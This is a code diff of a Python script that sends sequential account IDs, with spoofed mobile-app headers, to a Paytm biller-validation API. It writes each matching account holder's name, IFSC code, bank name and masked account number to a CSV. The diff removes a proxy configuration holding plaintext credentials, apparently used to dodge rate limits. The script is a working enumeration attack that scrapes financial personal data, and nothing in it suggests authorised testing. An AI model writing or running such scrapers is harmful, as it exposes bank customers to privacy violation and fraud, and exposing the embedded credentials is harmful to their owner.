@@ -7,12 +7,6 @@ import random
 import concurrent.futures
 
 
-username = "ankitkk"
-password = "Passwd221"
-proxies = {
-    "https": f"https://customer-{username}-cc-IN:{password}@pr.oxylabs.io:7777"
-}
-
 def send_request(i):
     url = "https://digitalproxy.paytm.com/billerservice/auth/v1/validateBiller?channel=ANDROIDAPP&deviceIdentifier=OnePlus-AC2001-271be052df9325b4&playStore=false&osVersion=13&client=androidapp&lang_id=1&language=en&deviceManufacturer=OnePlus&networkType=4G&locale=en-IN&deviceName=AC2001&version=10.22.0&child_site_id=1&site_id=1"
 
@@ -37,12 +31,12 @@ def send_request(i):
         "billerInfo": {"accountId": str(i)},
     }
 
-    response = requests.post(url, headers=headers, data=json.dumps(data), proxies=proxies)
+    response = requests.post(url, headers=headers, data=json.dumps(data))
     response_data = response.json()
 
     if response_data['code'] == '00' and response_data['status'] == True:
         biller_info = response_data['billerInfo']
-        with open('10th_may.csv', 'a', newline='') as file:
+        with open('10th_may1.csv', 'a', newline='') as file:
             writer = csv.writer(file)
             writer.writerow([biller_info['accountId'], biller_info['ifscCode'], biller_info['name'], biller_info['bankName'], biller_info['maskedBankAccount']])
         return True
